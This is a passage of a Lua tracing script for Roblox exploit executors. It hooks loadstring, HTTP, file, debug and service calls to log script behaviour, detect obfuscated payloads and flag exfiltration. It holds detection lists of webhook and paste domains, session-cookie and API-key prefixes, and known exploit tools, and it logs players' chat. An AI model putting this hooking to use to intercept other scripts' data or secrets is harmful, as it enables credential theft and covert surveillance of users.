                if CONFIG.script_attribution and getcallingscript then entering(); pcall(function() attrib=getcallingscript() end); leaving(); if attrib and attrib.Name then attrib=attrib.Name end end
                learn_remote(self,method,args)
                for i=1,args.n do if type(args[i])=="string" then autotaint_string(args[i],"remote_out") end end
                ev=log_event("remote",{class=class,method=method,args=args,target=self,attrib=attrib,src=src,line=line,fn=fn,frames=frames})
            elseif CONFIG.trace_signals and is_signal then ev=log_event("signal",{op=method,target=self,src=src,line=line,fn=fn,frames=frames})
            elseif CONFIG.trace_player and is_player then ev=log_event("player",{op=method,target=self,args=args,src=src,line=line,fn=fn,frames=frames})
            elseif CONFIG.trace_chat and is_chat then local msg=args[1] or (args[2] and tostring(args[2])) or ""; ev=log_event("chat",{op=method,message=msg,target=self,src=src,line=line,fn=fn,frames=frames})
            elseif CONFIG.trace_humanoid and is_humanoid then ev=log_event("humanoid",{op=method,target=self,args=args,src=src,line=line,fn=fn,frames=frames})
            elseif CONFIG.trace_inst_method and ({Destroy=true,ClearAllChildren=true,Remove=true,FindFirstChild=true,WaitForChild=true,SetPrimaryPartCFrame=true,PivotTo=true,Clone=true})[method] then ev=log_event("inst_method",{target=self,method=method,args=args,src=src,line=line,fn=fn,frames=frames})
            elseif CONFIG.trace_appearance and (method=="ApplyDescription" or method=="GetAppliedDescription") then ev=log_event("appearance",{op=method,target=self,args=args,src=src,line=line,fn=fn,frames=frames})
            elseif CONFIG.trace_calls then ev=log_event("call",{target=self,method=method,args=args,src=src,line=line,fn=fn,frames=frames}) end
            if ev then causal_push(ev.eid) end
            entering()
            local ok,a,b,c,d,e=pcall(old_namecall,self,...)
            leaving()
            if ev then causal_pop(ev.eid); trace_return(ev.eid,a,b,c,d,e) end
            if not ok then return old_namecall(self,...) end
            return a,b,c,d,e
        end)
        hook_registry["gm.__namecall"]=gm.__namecall
    end
    if setreadonly then pcall(setreadonly,gm,was_ro) end
end

function install_global_hooks()
    local env=getgenv and getgenv() or _G
    if CONFIG.trace_env then
        local old_setfenv=env.setfenv or setfenv
        if old_setfenv then env.setfenv=newcclosure(function(f,t)
            if in_reentry() then return old_setfenv(f,t) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("env",{op="setfenv(f,"..fmt_val(t,1)..")",src=s,line=l,fn=n,frames=fr})
            return old_setfenv(f,t)
        end) end
        local old_getfenv=env.getfenv or getfenv
        if old_getfenv then env.getfenv=newcclosure(function(f)
            if in_reentry() then return old_getfenv(f) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("env",{op="getfenv("..fmt_val(f,1)..")",src=s,line=l,fn=n,frames=fr})
            return old_getfenv(f)
        end) end
        if getsenv then
            local old_getsenv=getsenv
            env.getsenv=newcclosure(function(scr)
                if in_reentry() then return old_getsenv(scr) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("env",{op="getsenv("..fmt_ident(scr)..")",src=s,line=l,fn=n,frames=fr})
                return old_getsenv(scr)
            end)
        end
    end
    if CONFIG.trace_load then
        local old_ls=env.loadstring or loadstring
        if old_ls then env.loadstring=newcclosure(function(src,chunk)
            if in_reentry() then return old_ls(src,chunk) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            if type(src)=="string" then scan_string(src,{kind="loadstring",src=s,line=l,fn=n}); track_payload_hash(src,s); if CONFIG.trace_obfuscation and obfuscation_score then local os_=obfuscation_score(src); if os_>=(CONFIG.obfuscation_threshold or 8) then log_event("obfuscated_payload",{op="loadstring",score=os_,size=#src,hash=simple_hash(src),src=s,line=l,fn=n,frames=fr}) end end end
            log_event("load",{op="loadstring",size=type(src)=="string" and #src or 0,content=type(src)=="string" and src:sub(1,200) or nil,src=s,line=l,fn=n,frames=fr})
            return old_ls(src,chunk)
        end) end
        local old_load=env.load or load
        if old_load then env.load=newcclosure(function(chunk,name,mode,e)
            if in_reentry() then return old_load(chunk,name,mode,e) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            if type(chunk)=="string" then scan_string(chunk,{kind="load",src=s,line=l,fn=n}); track_payload_hash(chunk,s); if CONFIG.trace_obfuscation and obfuscation_score then local os_=obfuscation_score(chunk); if os_>=(CONFIG.obfuscation_threshold or 8) then log_event("obfuscated_payload",{op="load",score=os_,size=#chunk,hash=simple_hash(chunk),src=s,line=l,fn=n,frames=fr}) end end end
            log_event("load",{op="load",size=type(chunk)=="string" and #chunk or 0,src=s,line=l,fn=n,frames=fr})
            return old_load(chunk,name,mode,e)
        end) end
    end
    if CONFIG.trace_require then
        local old_req=env.require or require
        if old_req then env.require=newcclosure(function(target)
            if in_reentry() then return old_req(target) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("require",{target=target,src=s,line=l,fn=n,frames=fr})
            return old_req(target)
        end) end
    end
    if CONFIG.trace_rawnet then
        local old_rawset,old_rawget=rawset,rawget
        if old_rawset then env.rawset=newcclosure(function(t,k,v)
            if in_reentry() then return old_rawset(t,k,v) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("raw",{op="rawset",target=t,key=k,value=v,src=s,line=l,fn=n,frames=fr})
            return old_rawset(t,k,v)
        end) end
        if old_rawget then env.rawget=newcclosure(function(t,k)
            if in_reentry() then return old_rawget(t,k) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("raw",{op="rawget",target=t,key=k,value="?",src=s,line=l,fn=n,frames=fr})
            return old_rawget(t,k)
        end) end
    end
    if CONFIG.trace_instance and env.Instance and env.Instance.new then
        local old_new=env.Instance.new
        local mt=getmetatable(env.Instance) or {}
        local real_index=mt.__index
        env.Instance=setmetatable({new=newcclosure(function(class,parent)
            if in_reentry() then return old_new(class,parent) end
            entering(); local s,l,n,fr=caller_info(2)
            local result=old_new(class,parent)
            leaving()
            ancestry_hash_fn(result)
            log_event("instance",{class=class,result=result,src=s,line=l,fn=n,frames=fr})
            return result
        end)},{__index=function(_,k) if k=="new" then return nil end if real_index then return real_index(env.Instance,k) end return nil end})
    end
    if CONFIG.auto_attribute_spy then
        for _,name in ipairs({"setattribute","getattribute","setattributes"}) do
            local old=env[name]
            if type(old)=="function" then env[name]=newcclosure(function(inst,a,b)
                if in_reentry() then return old(inst,a,b) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("attribute",{op=name,target=tostring(inst),key=tostring(a),value=fmt_val(b,1),src=s,line=l,fn=n,frames=fr})
                return old(inst,a,b)
            end) end
        end
    end
    if CONFIG.auto_clipboard_spy then
        local old=env.setclipboard
        if type(old)=="function" then env.setclipboard=newcclosure(function(text)
            if in_reentry() then return old(text) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("clipboard",{op="setclipboard",size=type(text)=="string" and #text or 0,src=s,line=l,fn=n,frames=fr})
            return old(text)
        end) end
    end
    if CONFIG.auto_teleport_queue_spy then
        local old=env.queue_on_teleport
        if type(old)=="function" then env.queue_on_teleport=newcclosure(function(code)
            if in_reentry() then return old(code) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("teleport_queue",{op="queue_on_teleport",size=type(code)=="string" and #code or 0,preview=type(code)=="string" and code:sub(1,120) or "?",src=s,line=l,fn=n,frames=fr})
            if CONFIG.trace_rejoin_kit then last_teleport_queue_t=mono() end
            return old(code)
        end) end
    end
    if CONFIG.auto_custom_asset_spy then
        local old=env.getcustomasset
        if type(old)=="function" then env.getcustomasset=newcclosure(function(path)
            if in_reentry() then return old(path) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("custom_asset",{op="getcustomasset",path=tostring(path),src=s,line=l,fn=n,frames=fr})
            return old(path)
        end) end
    end
end

function install_coroutine_hooks()
    if not CONFIG.trace_coroutine then return end
    local co=coroutine
    for _,name in ipairs({"create","resume","yield","wrap","close","status","running","isyieldable"}) do
        local old=co[name]
        if type(old)=="function" then co[name]=newcclosure(function(...)
            if in_reentry() then return old(...) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("coroutine",{op=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
            if name=="create" and CONFIG.trace_deep_coroutine then
                local tk=thread_key(); coroutine_depth_tracker[tk]=(coroutine_depth_tracker[tk] or 0)+1
                if coroutine_depth_tracker[tk]>=(CONFIG.coroutine_depth_threshold or 5) then log_event("deep_coroutine",{op="high_depth",depth=coroutine_depth_tracker[tk],src=s,line=l,fn=n,frames=fr}) end
            end
            return old(...)
        end) end
    end
end

function install_task_hooks()
    if not CONFIG.trace_task then return end
    for _,name in ipairs({"spawn","defer","delay","wait","cancel","synchronize"}) do
        local old=task[name]
        if type(old)=="function" then task[name]=newcclosure(function(...)
            if in_reentry() then return old(...) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("task",{op=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
            return old(...)
        end) end
    end
end

function install_http_hooks()
    if not CONFIG.trace_http then return end
    local env=getgenv and getgenv() or _G
    local targets={{tbl=env,name="request"},{tbl=env,name="http_request"},{tbl=env,name="HttpGet"},{tbl=env,name="HttpPost"},{tbl=env.syn,name="request"}}
    for _,t in ipairs(targets) do
        if t.tbl and type(t.tbl[t.name])=="function" then
            local old=t.tbl[t.name]
            t.tbl[t.name]=newcclosure(function(opts,...)
                if in_reentry() then return old(opts,...) end
                entering(); local s,l,n,fr=caller_info(2)
                local url,method,body
                if type(opts)=="table" then url=opts.Url or opts.url; method=opts.Method or opts.method; body=opts.Body or opts.body else url=tostring(opts) end
                leaving()
                if CONFIG.trace_domain_reputation and url and SUSPICIOUS_DOMAINS then
                    for _,pat in ipairs(SUSPICIOUS_DOMAINS) do
                        if url:find(pat) then log_event("suspicious_domain",{op="matched",url=url,pattern=pat,src=s,line=l,fn=n,frames=fr}); break end
                    end
                end
                if CONFIG.trace_domain_flood and url then
                    local dom=url:match("https?://([^/:]+)") or "?"
                    local now=mono(); local dr=domain_rate[dom]
                    if not dr then domain_rate[dom]={count=1,ws=now}
                    else dr.count=dr.count+1
                        if now-dr.ws>=(CONFIG.domain_flood_window_s or 10) then
                            if dr.count>(CONFIG.domain_flood_threshold or 5) then log_event("domain_flood",{op="rate_exceeded",domain=dom,count=dr.count,src=s,line=l,fn=n,frames=fr}) end
                            dr.count=1; dr.ws=now
                        end
                    end
                end
                fingerprint_http(url,body,{src=s,line=l,fn=n})
                log_event("http",{op=t.name,url=url,method=method,opts=type(opts)=="table" and opts or nil,src=s,line=l,fn=n,frames=fr})
                if body then scan_decoded(tostring(body),{kind="http_decoded",src=s,line=l,fn=n}) end
                if body then autotaint_string(tostring(body),"http_body") end
                local resp=table.pack(old(opts,...))
                if CONFIG.trace_http_response and type(resp[1])=="table" then
                    local rbody=resp[1].Body or resp[1].body
                    if type(rbody)=="string" and #rbody>0 then
                        scan_string(rbody,{kind="http_response",src=s,line=l,fn=n})
                        scan_decoded(rbody,{kind="http_response_decoded",src=s,line=l,fn=n})
                        log_event("http_response",{op=t.name,url=url,status=tostring(resp[1].StatusCode or resp[1].status or "?"),body_size=#rbody,src=s,line=l,fn=n,frames=fr})
                    end
                end
                return table.unpack(resp,1,resp.n)
            end)
        end
    end
end

function install_file_hooks()
    if not CONFIG.trace_file_io then return end
    local env=getgenv and getgenv() or _G
    for _,name in ipairs({"readfile","writefile","appendfile","listfiles","delfile","isfile","isfolder","makefolder"}) do
        local old=env[name]
        if type(old)=="function" then env[name]=newcclosure(function(path,...)
            if in_reentry() then return old(path,...) end
            entering(); local s,l,n,fr=caller_info(2)
            local content
            if name=="writefile" or name=="appendfile" then content=select(1,...) end
            leaving()
            if type(content)=="string" then autotaint_string(content,"file_write"); scan_string(content,{kind="file_content",src=s,line=l,fn=n}); track_file_hash(content) end
            log_event("file",{op=name,path=tostring(path),content=type(content)=="string" and content or nil,src=s,line=l,fn=n,frames=fr})
            return old(path,...)
        end) end
    end
end

function install_debug_hooks()
    if not CONFIG.trace_debug then return end
    local env=getgenv and getgenv() or _G
    for _,name in ipairs({"getgc","getreg","getinstances","getnilinstances","getloadedmodules","getscripts","getcallingscript","getscriptbytecode","decompile","dump_function"}) do
        local old=env[name]
        if type(old)=="function" then env[name]=newcclosure(function(...)
            if in_reentry() then return old(...) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("debug",{op=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
            return old(...)
        end) end
    end
end

function install_closure_hooks()
    if not CONFIG.trace_closure then return end
    local env=getgenv and getgenv() or _G
    for _,name in ipairs({"hookfunction","restorefunction","clonefunction","newcclosure","checkcaller"}) do
        local old=env[name]
        if type(old)=="function" then env[name]=newcclosure(function(...)
            if in_reentry() then return old(...) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            local a=table.pack(...)
            if name=="hookfunction" and type(a[1])=="function" then
                snapshot_upvalues(a[1])
                log_event("closure",{op=name,target=a[1],src=s,line=l,fn=n,frames=fr})
            else
                log_event("closure",{op=name,target=a[1],src=s,line=l,fn=n,frames=fr})
            end
            return old(...)
        end) end
    end
end

function install_player_hooks()
    if not CONFIG.player_tracking then return end
    pcall(function()
        local Players=game:GetService("Players")
        Players.PlayerAdded:Connect(function(plr) log_event("player",{op="Joined",target=plr.Name,args=table.pack(plr.Name,plr.DisplayName,plr.UserId,plr.AccountAge,tostring(plr.MembershipType)),src="PlayerAdded",line=0,fn="connect"}) end)
        Players.PlayerRemoving:Connect(function(plr) log_event("player",{op="Left",target=plr.Name,args=table.pack(plr.Name,plr.UserId),src="PlayerRemoving",line=0,fn="connect"}) end)
    end)
end

function install_chat_hooks()
    if not CONFIG.chat_capture then return end
    pcall(function()
        local TCS=game:GetService("TextChatService")
        if TCS and TCS.OnIncomingMessage then
            TCS.OnIncomingMessage=(function(old) return function(msg)
                if not in_reentry() and msg then entering(); log_event("chat",{op="incoming",message=msg.Text or "?",from=msg.TextSource and msg.TextSource.Name or "?",src="TextChatService",line=0,fn="OnIncomingMessage"}); leaving() end
                if old then return old(msg) end
            end end)(TCS.OnIncomingMessage)
        end
        if TCS and TCS.TextChannels then for _,ch in ipairs(TCS.TextChannels:GetChildren()) do pcall(function()
            ch.MessageReceived:Connect(function(msg) log_event("chat",{op="received",message=msg.Text or "?",from=msg.TextSource and msg.TextSource.Name or "?",src="TextChannel",line=0,fn="MessageReceived"}) end)
        end) end end
    end)
end

function install_character_hooks()
    if not CONFIG.auto_character_hooks then return end
    local function hook_char(char)
        if not char then return end
        pcall(function()
            char.ChildAdded:Connect(function(c) log_event("character",{op="child_added",class=c.ClassName,name=c.Name,src="Character",line=0,fn="connect"}) end)
            char.ChildRemoved:Connect(function(c) log_event("character",{op="child_removed",class=c.ClassName,name=c.Name,src="Character",line=0,fn="connect"}) end)
            local hum=char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Died:Connect(function() log_event("character",{op="Died",name=char.Name,src="Humanoid",line=0,fn="Died"}) end)
                hum.HealthChanged:Connect(function(h) log_event("character",{op="HealthChanged",health=h,src="Humanoid",line=0,fn="HealthChanged"}) end)
                hum.StateChanged:Connect(function(_,new) log_event("character",{op="StateChanged",state=tostring(new),src="Humanoid",line=0,fn="StateChanged"}) end)
                for _,prop in ipairs({"WalkSpeed","JumpPower","JumpHeight","HipHeight"}) do
                    hum:GetPropertyChangedSignal(prop):Connect(function() log_event("humanoid",{op=prop,value=hum[prop],target=char.Name,src="Humanoid",line=0,fn="prop"}) end)
                end
            end
        end)
    end
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer
        if plr then if plr.Character then hook_char(plr.Character) end; plr.CharacterAdded:Connect(hook_char) end
    end)
end

function install_descendant_gui_spy()
    if not (CONFIG.auto_descendant_spy or CONFIG.auto_gui_detector) then return end
    local GUI_CLASSES={ScreenGui=true,BillboardGui=true,SurfaceGui=true,TextLabel=true,TextButton=true,TextBox=true,ImageLabel=true,ImageButton=true,Frame=true,ScrollingFrame=true,ViewportFrame=true}
    pcall(function()
        game.DescendantAdded:Connect(function(inst)
            local class=inst.ClassName
            if CONFIG.auto_gui_detector and GUI_CLASSES[class] then log_event("gui",{op="added",class=class,name=inst.Name,parent=inst.Parent and inst.Parent:GetFullName() or "?",src="DescendantAdded",line=0,fn="connect"}); return end
            if CONFIG.auto_descendant_spy and not CONFIG.descendant_ignore_classes[class] then
                local filter=CONFIG.descendant_class_filter
                if not filter or class==filter then
                    local src
                    if getcallingscript then local ok,s=pcall(getcallingscript); if ok and s and s.Name then src=s.Name end end
                    log_event("descendant",{op="added",class=class,name=inst.Name,parent=inst.Parent and inst.Parent:GetFullName() or "?",src=src or "DescendantAdded",line=0,fn="connect"})
                end
            end
        end)
        game.DescendantRemoving:Connect(function(inst)
            local class=inst.ClassName
            if CONFIG.auto_descendant_spy and not CONFIG.descendant_ignore_classes[class] then
                log_event("descendant",{op="removed",class=class,name=inst.Name,parent=inst.Parent and inst.Parent:GetFullName() or "?",src="DescendantRemoving",line=0,fn="connect"})
            end
        end)
    end)
end

function install_drawing_spy()
    if not CONFIG.auto_drawing_spy then return end
    pcall(function()
        local env=getgenv and getgenv() or _G
        local D=env.Drawing or Drawing; if not D or type(D.new)~="function" then return end
        local old=D.new
        D.new=newcclosure(function(class)
            if in_reentry() then return old(class) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            log_event("drawing",{op="new",class=tostring(class),src=s,line=l,fn=n,frames=fr})
            return old(class)
        end)
    end)
end

function install_uis_input()
    if not CONFIG.auto_uis_input then return end
    pcall(function()
        local UIS=game:GetService("UserInputService")
        UIS.InputBegan:Connect(function(input,gp) log_event("input",{op="Began",input_type=tostring(input.UserInputType),key=tostring(input.KeyCode),processed=gp and "1" or "0",src="UserInputService",line=0,fn="connect"}) end)
        UIS.InputEnded:Connect(function(input) log_event("input",{op="Ended",input_type=tostring(input.UserInputType),key=tostring(input.KeyCode),src="UserInputService",line=0,fn="connect"}) end)
    end)
end

function install_cas_spy()
    if not CONFIG.auto_cas_spy then return end
    pcall(function()
        local CAS=game:GetService("ContextActionService")
        for _,name in ipairs({"BindAction","BindActionAtPriority","UnbindAction"}) do
            local old=CAS[name]
            if type(old)=="function" then CAS[name]=newcclosure(function(a,...)
                if in_reentry() then return old(a,...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("cas",{op=name,action=tostring(a),src=s,line=l,fn=n,frames=fr})
                return old(a,...)
            end) end
        end
    end)
end

function install_datastore_spy()
    if not CONFIG.auto_datastore_spy then return end
    pcall(function()
        local DSS=game:GetService("DataStoreService")
        for _,name in ipairs({"GetDataStore","GetGlobalDataStore","GetOrderedDataStore"}) do
            local old=DSS[name]
            if type(old)=="function" then DSS[name]=newcclosure(function(self,storeName,scope,...)
                if in_reentry() then return old(self,storeName,scope,...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("datastore",{op=name,store=tostring(storeName or "?"),scope=tostring(scope or "global"),src=s,line=l,fn=n,frames=fr})
                return old(self,storeName,scope,...)
            end) end
        end
    end)
end

function install_marketplace_spy()
    if not CONFIG.auto_marketplace_spy then return end
    pcall(function()
        local MS=game:GetService("MarketplaceService")
        for _,name in ipairs({"PromptPurchase","PromptGamePassPurchase","PromptProductPurchase","GetProductInfo"}) do
            local old=MS[name]
            if type(old)=="function" then MS[name]=newcclosure(function(self,a,b,...)
                if in_reentry() then return old(self,a,b,...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("marketplace",{op=name,a=tostring(a or "?"),b=tostring(b or "?"),src=s,line=l,fn=n,frames=fr})
                return old(self,a,b,...)
            end) end
        end
    end)
end

function install_teleport_spy()
    if not CONFIG.auto_teleport_spy then return end
    pcall(function()
        local TS=game:GetService("TeleportService")
        for _,name in ipairs({"Teleport","TeleportToPlaceInstance","TeleportToPrivateServer"}) do
            local old=TS[name]
            if type(old)=="function" then TS[name]=newcclosure(function(self,...)
                if in_reentry() then return old(self,...) end
                entering(); local s,l,n,fr=caller_info(2); local a=table.pack(...); leaving()
                log_event("teleport",{op=name,arg1=tostring(a[1] or "?"),arg2=tostring(a[2] or "?"),src=s,line=l,fn=n,frames=fr})
                if CONFIG.trace_rejoin_kit and (mono()-last_teleport_queue_t)<(CONFIG.rejoin_kit_window_s or 3) then
                    log_event("rejoin_kit",{op="detected",teleport_method=name,queue_delta=mono()-last_teleport_queue_t,src=s,line=l,fn=n,frames=fr})
                end
                return old(self,...)
            end) end
        end
    end)
end

function install_sound_spy()
    if not CONFIG.auto_sound_spy then return end
    pcall(function()
        game.DescendantAdded:Connect(function(inst)
            if inst.ClassName~="Sound" then return end
            inst.Played:Connect(function() log_event("sound",{op="Played",target=inst:GetFullName(),id=tostring(inst.SoundId),volume=tostring(inst.Volume),src="Sound",line=0,fn="connect"}) end)
        end)
    end)
end

function install_animation_spy()
    if not CONFIG.auto_animation_spy then return end
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer; if not plr then return end
        plr.CharacterAdded:Connect(function(char)
            task.wait(0.5)
            local animator=char:FindFirstChildOfClass("Animator"); if not animator then return end
            animator.AnimationPlayed:Connect(function(track) log_event("animation",{op="played",id=track.Animation and tostring(track.Animation.AnimationId) or "?",priority=tostring(track.Priority),speed=tostring(track.Speed),src="Animator",line=0,fn="connect"}) end)
        end)
    end)
end

function install_camera_spy()
    if not CONFIG.auto_camera_spy then return end
    pcall(function()
        local cam=workspace.CurrentCamera; if not cam then return end
        for _,prop in ipairs({"CameraType","FieldOfView"}) do cam:GetPropertyChangedSignal(prop):Connect(function() log_event("camera",{op=prop,value=tostring(cam[prop]),src="Camera",line=0,fn="prop"}) end) end
    end)
end

function install_lighting_spy()
    if not CONFIG.auto_lighting_spy then return end
    pcall(function()
        local L=game:GetService("Lighting")
        for _,prop in ipairs({"ClockTime","Ambient","OutdoorAmbient","Brightness","FogEnd","FogStart","GlobalShadows","ExposureCompensation"}) do
            local ok,sig=pcall(function() return L:GetPropertyChangedSignal(prop) end)
            if ok and sig then sig:Connect(function() log_event("lighting",{op="changed",prop=prop,value=tostring(L[prop]),src="Lighting",line=0,fn="prop"}) end) end
        end
    end)
end

function install_error_capture()
    if not CONFIG.auto_error_capture then return end
    pcall(function()
        local SC=game:GetService("ScriptContext")
        SC.Error:Connect(function(message,stack,script_) log_event("error",{op="runtime",message=tostring(message):sub(1,300),trace=tostring(stack):sub(1,300),script=script_ and script_.Name or "?",src="ScriptContext",line=0,fn="connect"}) end)
    end)
end

function install_network_stats()
    if not CONFIG.auto_network_stats then return end
    task.spawn(function()
        while true do
            task.wait(CONFIG.network_sample_interval)
            pcall(function()
                local net=game:GetService("Stats").Network
                if net and net.ServerStatsItem then
                    local ping=net.ServerStatsItem["Data Ping"] and net.ServerStatsItem["Data Ping"]:GetValue() or 0
                    local inKB=net.ServerStatsItem["Data In"] and net.ServerStatsItem["Data In"]:GetValue() or 0
                    local outKB=net.ServerStatsItem["Data Out"] and net.ServerStatsItem["Data Out"]:GetValue() or 0
                    log_event("network",{op="sample",ping_ms=string.format("%.1f",ping),["in"]=string.format("%.1f",inKB),out=string.format("%.1f",outKB),src="Stats",line=0,fn="sample"})
                end
            end)
        end
    end)
end

function install_fps_counter()
    if not CONFIG.auto_fps_counter then return end
    task.spawn(function()
        local RS=game:GetService("RunService")
        while true do
            local frames=0; local start=os.clock()
            local conn=RS.RenderStepped:Connect(function() frames=frames+1 end)
            task.wait(CONFIG.fps_sample_interval)
            if conn then conn:Disconnect() end
            local elapsed=os.clock()-start
            if elapsed>0 then log_event("fps",{op="sample",fps=string.format("%.1f",frames/elapsed),src="RunService",line=0,fn="sample"}) end
        end
    end)
end

function install_env_snapshot()
    if not CONFIG.auto_env_snapshot then return end
    task.spawn(function()
        task.wait(2)
        pcall(function()
            local env=getgenv and getgenv() or _G; local n=0
            for _ in pairs(env) do n=n+1 end
            log_event("env_snapshot",{label="post_load",global_keys=n,src="env_snapshot",line=0,fn="snapshot"})
        end)
    end)
end

function install_known_bad_scan()
    if not CONFIG.auto_known_bad_scan then return end
    local KNOWN_BAD={"kavo","owl","orion","hydrogen","apolon","vega","solara","krnl","infinite yield","iy_","dark dex","dex","hydroxide","remotespy","rspy","synapse","script-ware","sw_","fluxus","codex","arceus"}
    task.spawn(function()
        task.wait(3)
        if not getscripts then return end
        for _,scr in ipairs(getscripts()) do
            local lower=scr.Name:lower()
            for _,bad in ipairs(KNOWN_BAD) do
                if lower:find(bad,1,true) then log_event("known_bad",{op="loaded",name=scr.Name,signature=bad,class=scr.ClassName,src="script_scan",line=0,fn="scan"}); break end
            end
            pcall(scan_script_constants,scr)
        end
    end)
end

function install_hook_sweep()
    if not CONFIG.auto_hook_sweep then return end
    task.spawn(function()
        while true do
            task.wait(30)
            pcall(function()
                if not getgc or not iscclosure then return end
                local n=0
                for _,obj in ipairs(getgc()) do if type(obj)=="function" and iscclosure(obj) then n=n+1 end end
                log_event("hook_sweep",{op="scan",cclosures=n,src="gc_scan",line=0,fn="sweep"})
            end)
        end
    end)
end

function install_heap_sampler()
    if not CONFIG.heap_sampler then return end
    task.spawn(function()
        local last_fn=0
        while true do
            task.wait(30)
            pcall(function()
                if not getgc then return end
                local counts={}
                for _,obj in ipairs(getgc()) do local t=typeof(obj); counts[t]=(counts[t] or 0)+1 end
                local cur=counts["function"] or 0
                if last_fn>0 and cur-last_fn>500 then log_event("heap",{op="function_spike",prev=last_fn,now=cur,delta=cur-last_fn,src="heap",line=0,fn="sample"}) end
                last_fn=cur
            end)
        end
    end)
end

function install_memory_watch()
    if not CONFIG.memory_watch then return end
    if not (CAP.readmemory and CAP.writememory) then cap_set("memory_watch","UNAVAILABLE","readmemory/writememory not exposed"); return end
    task.spawn(function()
        while true do
            task.wait(3)
            pcall(function()
                local sc=game:GetService("ScriptContext"); local addr=tostring(sc)
                log_event("memwatch",{op="addr_sample",target="ScriptContext",addr=addr,src="memwatch",line=0,fn="sample"})
            end)
        end
    end)
end

function install_sig_of_day()
    if not CONFIG.sig_of_day then return end
    task.spawn(function()
        task.wait(5)
        pcall(function()
            if not getscripts then return end
            local names={}
            for _,scr in ipairs(getscripts()) do names[#names+1]=scr.Name end
            table.sort(names)
            local h=simple_hash(table.concat(names,"|"))
            log_event("sigofday",{op="hash",hash=h,script_count=#names,src="sigofday",line=0,fn="hash"})
        end)
    end)
end

function install_suspend_guard()
    if not CONFIG.suspend_guard then return end
    local old_cancel=task.cancel
    if type(old_cancel)=="function" then
        task.cancel=newcclosure(function(thread,...)
            log_event("suspend",{op="task_cancel",target=tostring(thread),src="suspend",line=0,fn="guard"})
            return old_cancel(thread,...)
        end)
    end
end

function install_c_api_tracer()
    if not CONFIG.c_api_trace then return end
    if not (CAP.hookmetamethod and CAP.getrawmetatable) then cap_set("c_api_trace","PARTIAL","piggybacks on __namecall") end
end

SUSPICIOUS_DOMAINS={
    "pastebin%.com","webhook%.site","requestbin","ngrok%.io","ngrok%.app",
    "pipedream%.net","hookbin%.com","beeceptor%.com","localhost","127%.0%.0%.1",
    "0%.0%.0%.0","requestcatcher%.com","httpbin%.org","webhook%.site",
}

PARTIAL_PATTERNS={
    {name="jwt_partial",prefix="eyJ",min_len=20},
    {name="roblosec_partial",prefix="_|WARNING:-DO-NOT-SHARE",min_len=20},
    {name="discord_webhook_partial",prefix="https://discord.com/api/webhooks/",min_len=30},
    {name="bearer_partial",prefix="Bearer ",min_len=10},
    {name="openai_partial",prefix="sk-",min_len=8},
}

function scan_partial_tokens(s,ctx)
    if not CONFIG.trace_token_reconstruct or type(s)~="string" then return end
    if not PARTIAL_PATTERNS then return end
    for _,pat in ipairs(PARTIAL_PATTERNS) do
        if #s>=pat.min_len and s:find(pat.prefix,1,true) then
            local h=simple_hash(s:sub(1,30))
            local src=ctx and ctx.src or "?"
            if not partial_tokens[h] then
                partial_tokens[h]={name=pat.name,srcs={[src]=true},count=1,first_t=mono()}
            else
                local rec=partial_tokens[h]; rec.count=rec.count+1
                if not rec.srcs[src] then
                    rec.srcs[src]=true
                    local sc=0; for _ in pairs(rec.srcs) do sc=sc+1 end
                    if sc>=2 then
                        log_event("token_reconstruction",{op="multi_source",pattern=pat.name,sources=sc,count=rec.count,src=src,line=ctx and ctx.line or 0,fn=ctx and ctx.fn or "?"})
                    end
                end
            end
        end
    end
end

function check_aurora_upvalues()
    if not CONFIG.trace_upvalue_tamper then return end
    if not debug.getupvalues then return end
    for i,snap in pairs(aurora_upvalue_snapshots) do
        pcall(function()
            local ups=debug.getupvalues(snap.fn)
            if not ups then return end
            for j,v in ipairs(ups) do
                local old=snap.ups[j]
                if old and typeof(v)~=old.type then
                    log_event("upvalue_tamper",{op="type_changed",fn_idx=i,upvalue_idx=j,old_type=old.type,new_type=typeof(v),src="upvalue_watch",line=0,fn="check"})
                end
            end
        end)
    end
end

function snapshot_aurora_upvalues()
    if not CONFIG.trace_upvalue_tamper then return end
    if not debug.getupvalues then cap_set("upvalue_tamper","UNAVAILABLE","debug.getupvalues not exposed"); return end
    local targets={flush_creds_queue,flush_envlog_queue,send_embed}
    for i,fn in ipairs(targets) do
        pcall(function()
            local ups=debug.getupvalues(fn)
            if not ups then return end
            aurora_upvalue_snapshots[i]={fn=fn,ups={}}
            for j,v in ipairs(ups) do
                aurora_upvalue_snapshots[i].ups[j]={type=typeof(v)}
            end
        end)
    end
    log_event("upvalue_tamper",{op="snapshot_taken",count=#targets,src="upvalue_watch",line=0,fn="init"})
end

function install_input_inject_spy()
    if not CONFIG.trace_input_inject then return end
    local env=getgenv and getgenv() or _G
    for _,name in ipairs({"fireclickdetector","firetouchinterest","fireproximityprompt","firesignal"}) do
        local old=env[name]
        if type(old)=="function" then
            env[name]=newcclosure(function(...)
                if in_reentry() then return old(...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                log_event("input_inject",{op=name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
                return old(...)
            end)
